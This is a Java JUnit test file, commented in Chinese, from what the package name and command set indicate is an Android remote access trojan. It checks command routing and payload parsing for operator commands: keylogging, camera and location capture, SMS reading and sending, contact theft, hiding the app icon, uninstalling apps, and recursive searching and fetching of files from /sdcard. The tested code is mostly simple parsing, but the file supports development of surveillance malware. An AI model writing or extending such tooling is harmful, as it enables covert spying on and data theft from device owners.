package com.vendor.rat.control.handler;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import org.junit.Before;
import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.TemporaryFolder;

import java.io.File;
import java.io.FileWriter;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;

import static org.junit.Assert.*;

/**
 * TDD 测试: PanelSendHandler screencomd 命令解析与路由
 *
 * 覆盖:
 * 1. dispatchScreenCommand 路由表完整性
 * 2. 各命令 payload 字段解析
 * 3. 文件搜索逻辑 (searchFilesRecursive)
 * 4. 数据格式验证
 */
public class ScreenCommandTest {

    @Rule
    public TemporaryFolder tempFolder = new TemporaryFolder();

    // ============ 1. 路由表完整性测试 ============

    /**
     * 验证所有 PanelSendHandler 的 subc 都在 dispatchScreenCommand 中有对应处理
     */
    @Test
    public void routingTable_shouldCoverAllPanelSendHandlerSubc() {
        // PanelSendHandler.php 中定义的所有 subc
        Set<String> expectedSubc = new HashSet<>(Arrays.asList(
            "Screen", "SMS", "SMSSEND", "Contacts",
            "files", "viewfile", "changefiles",
            "LOADAPPS", "OPENAPP", "UNINSTALLAPP",
            "Keylog", "Logdate",
            "Location", "Locationoff",
            "Camera", "CameraOff",
            "Hideico", "Rename", "DIAO",
            "srch", "cocu", "chat",
            "fetch", "display", "out"
        ));

        // 从 CommandDispatcher.dispatchScreenCommand 的 switch 中提取的 subc
        Set<String> handledSubc = new HashSet<>(Arrays.asList(
            "Screen", "out",
            "SMS", "SMSSEND",
            "Contacts",
            "files", "viewfile", "changefiles",
            "LOADAPPS", "OPENAPP", "UNINSTALLAPP",
            "Keylog", "Logdate",
            "Location", "Locationoff",
            "Camera", "CameraOff",
            "Hideico", "Rename", "DIAO",
            "srch", "cocu", "chat",
            "fetch", "display"
        ));

        for (String subc : expectedSubc) {
            assertTrue("Missing handler for subc: " + subc, handledSubc.contains(subc));
        }
    }

    // ============ 2. Payload 字段解析测试 ============

    @Test
    public void smsSendPayload_shouldExtractNumberAndMessage() {
        JsonObject payload = new JsonObject();
        payload.addProperty("smsnumber", "13800138000");
        payload.addProperty("message", "Hello World");

        assertEquals("13800138000", ScreenActionParser.getString(payload, "smsnumber", ""));
        assertEquals("Hello World", ScreenActionParser.getString(payload, "message", ""));
    }

    @Test
    public void smsSendPayload_missingFields_shouldReturnDefaults() {
        JsonObject payload = new JsonObject();

        assertEquals("", ScreenActionParser.getString(payload, "smsnumber", ""));
        assertEquals("", ScreenActionParser.getString(payload, "message", ""));
    }

    @Test
    public void filesPayload_shouldExtractFilepath() {
        JsonObject payload = new JsonObject();
        payload.addProperty("filepath", "/sdcard/DCIM");

        assertEquals("/sdcard/DCIM", ScreenActionParser.getString(payload, "filepath", "/sdcard"));
    }

    @Test
    public void filesPayload_missingFilepath_shouldReturnDefault() {
        JsonObject payload = new JsonObject();

        assertEquals("/sdcard", ScreenActionParser.getString(payload, "filepath", "/sdcard"));
    }

    @Test
    public void fetchPayload_shouldExtractFpath() {
        JsonObject payload = new JsonObject();
        payload.addProperty("fpath", "/sdcard/Download");

        assertEquals("/sdcard/Download", ScreenActionParser.getString(payload, "fpath", ""));
    }

    @Test
    public void openAppPayload_shouldExtractPackage() {
        JsonObject payload = new JsonObject();
        payload.addProperty("package", "com.example.app");

        assertEquals("com.example.app", ScreenActionParser.getString(payload, "package", ""));
    }

    @Test
    public void uninstallAppPayload_shouldExtractPackage() {
        JsonObject payload = new JsonObject();
        payload.addProperty("package", "com.malware.app");

        assertEquals("com.malware.app", ScreenActionParser.getString(payload, "package", ""));
    }

    @Test
    public void keylogPayload_shouldExtractComdtype() {
        JsonObject payload = new JsonObject();
        payload.addProperty("comdtype", "0");

        assertEquals("0", ScreenActionParser.getString(payload, "comdtype", ""));
    }

    @Test
    public void logdatePayload_shouldExtractKdate() {
        JsonObject payload = new JsonObject();
        payload.addProperty("kdate", "2026-03-19");

        assertEquals("2026-03-19", ScreenActionParser.getString(payload, "kdate", ""));
    }

    @Test
    public void renamePayload_shouldExtractName() {
        JsonObject payload = new JsonObject();
        payload.addProperty("name", "新设备名");

        assertEquals("新设备名", ScreenActionParser.getString(payload, "name", ""));
    }

    @Test
    public void changeFilesPayload_shouldExtractComdtypeAndFilepath() {
        JsonObject payload = new JsonObject();
        payload.addProperty("comdtype", "R");
        payload.addProperty("filepath", "/sdcard/test.txt");

        assertEquals("R", ScreenActionParser.getString(payload, "comdtype", ""));
        assertEquals("/sdcard/test.txt", ScreenActionParser.getString(payload, "filepath", ""));
    }

    @Test
    public void searchPayload_shouldExtractSearchParams() {
        JsonObject payload = new JsonObject();
        payload.addProperty("srchfor", "*.jpg");
        payload.addProperty("srchin", "/sdcard/DCIM");

        assertEquals("*.jpg", ScreenActionParser.getString(payload, "srchfor", ""));
        assertEquals("/sdcard/DCIM", ScreenActionParser.getString(payload, "srchin", "/sdcard"));
    }

    @Test
    public void viewFilePayload_shouldExtractFilepath() {
        JsonObject payload = new JsonObject();
        payload.addProperty("filepath", "/sdcard/photo.jpg");

        assertEquals("/sdcard/photo.jpg", ScreenActionParser.getString(payload, "filepath", ""));
    }

    @Test
    public void galleryPayload_shouldExtractFilepath() {
        JsonObject payload = new JsonObject();
        payload.addProperty("filepath", "/sdcard/DCIM/Camera/");

        assertEquals("/sdcard/DCIM/Camera/", ScreenActionParser.getString(payload, "filepath", "/sdcard/DCIM/Camera"));
    }

    @Test
    public void galleryPayload_missingFilepath_shouldReturnDefault() {
        JsonObject payload = new JsonObject();

        assertEquals("/sdcard/DCIM/Camera", ScreenActionParser.getString(payload, "filepath", "/sdcard/DCIM/Camera"));
    }

    // ============ 3. 文件搜索逻辑测试 ============

    @Test
    public void fileSearch_shouldFindMatchingFiles() throws Exception {
        // 创建临时文件结构
        File dir = tempFolder.newFolder("testdir");
        new File(dir, "photo1.jpg").createNewFile();
        new File(dir, "photo2.jpg").createNewFile();
        new File(dir, "document.pdf").createNewFile();
        new File(dir, "notes.txt").createNewFile();

        JsonArray results = new JsonArray();
        FileSearchHelper.searchFilesRecursive(dir, "*.jpg", results, 500);

        assertEquals(2, results.size());
        assertTrue(results.get(0).getAsString().contains("photo"));
        assertTrue(results.get(1).getAsString().contains("photo"));
    }

    @Test
    public void fileSearch_shouldSearchRecursively() throws Exception {
        File dir = tempFolder.newFolder("root");
        File sub = new File(dir, "subdir");
        sub.mkdirs();

        new File(dir, "top.jpg").createNewFile();
        new File(sub, "nested.jpg").createNewFile();
        new File(sub, "other.txt").createNewFile();

        JsonArray results = new JsonArray();
        FileSearchHelper.searchFilesRecursive(dir, "*.jpg", results, 500);

        assertEquals(2, results.size());
    }

    @Test
    public void fileSearch_shouldRespectLimit() throws Exception {
        File dir = tempFolder.newFolder("many");
        for (int i = 0; i < 10; i++) {
            new File(dir, "file" + i + ".jpg").createNewFile();
        }

        JsonArray results = new JsonArray();
        FileSearchHelper.searchFilesRecursive(dir, "*.jpg", results, 3);

        assertEquals(3, results.size());
    }

    @Test
    public void fileSearch_shouldReturnEmptyForNoMatch() throws Exception {
        File dir = tempFolder.newFolder("empty");
        new File(dir, "document.pdf").createNewFile();

        JsonArray results = new JsonArray();
        FileSearchHelper.searchFilesRecursive(dir, "*.jpg", results, 500);

        assertEquals(0, results.size());
    }

    @Test
    public void fileSearch_shouldHandleNonExistentDir() {
        File dir = new File("/nonexistent/path");

        JsonArray results = new JsonArray();
        FileSearchHelper.searchFilesRecursive(dir, "*.jpg", results, 500);

        assertEquals(0, results.size());
    }

    @Test
    public void fileSearch_shouldHandleEmptyPattern() throws Exception {
        File dir = tempFolder.newFolder("all");
        new File(dir, "a.txt").createNewFile();
        new File(dir, "b.txt").createNewFile();

        JsonArray results = new JsonArray();
        // 空 pattern (去掉 *) 匹配所有文件
        FileSearchHelper.searchFilesRecursive(dir, "*", results, 500);

        assertEquals(2, results.size());
    }

    // ============ 4. 文件列表 JSON 格式测试 ============

    @Test
    public void fileListItem_shouldContainRequiredFields() throws Exception {
        File dir = tempFolder.newFolder("filelist");
        File testFile = new File(dir, "test.txt");
        FileWriter fw = new FileWriter(testFile);
        fw.write("hello");
        fw.close();
        new File(dir, "subdir").mkdirs();

        JsonArray arr = FileListHelper.buildFileList(dir);

        assertTrue(arr.size() >= 2);

        // 验证文件项
        boolean foundFile = false;
        boolean foundDir = false;
        for (int i = 0; i < arr.size(); i++) {
            JsonObject item = arr.get(i).getAsJsonObject();
            assertTrue(item.has("name"));
            assertTrue(item.has("path"));
            assertTrue(item.has("size"));
            assertTrue(item.has("isDirectory"));
            assertTrue(item.has("lastModified"));

            if ("test.txt".equals(item.get("name").getAsString())) {
                assertFalse(item.get("isDirectory").getAsBoolean());
                assertEquals("5", item.get("size").getAsString());
                foundFile = true;
            }
            if ("subdir".equals(item.get("name").getAsString())) {
                assertTrue(item.get("isDirectory").getAsBoolean());
                foundDir = true;
            }
        }
        assertTrue("test.txt not found", foundFile);
        assertTrue("subdir not found", foundDir);
    }

    @Test
    public void fileListItem_emptyDir_shouldReturnEmptyArray() throws Exception {
        File dir = tempFolder.newFolder("emptydir");

        JsonArray arr = FileListHelper.buildFileList(dir);

        assertEquals(0, arr.size());
    }

    @Test
    public void fileListItem_nonExistentDir_shouldReturnEmptyArray() {
        File dir = new File("/nonexistent");

        JsonArray arr = FileListHelper.buildFileList(dir);

        assertEquals(0, arr.size());
    }

    // ============ 5. screencomd null/empty 边界测试 ============

    @Test
    public void getString_nullPayload_shouldReturnDefault() {
        assertEquals("default", ScreenActionParser.getString(null, "key", "default"));
    }

    @Test
    public void getString_nullKey_shouldReturnDefault() {
        JsonObject payload = new JsonObject();
        assertEquals("default", ScreenActionParser.getString(payload, null, "default"));
    }

    @Test
    public void getString_jsonNullValue_shouldReturnDefault() {
        JsonObject payload = new JsonObject();
        payload.add("key", com.google.gson.JsonNull.INSTANCE);
        assertEquals("default", ScreenActionParser.getString(payload, "key", "default"));
    }
}
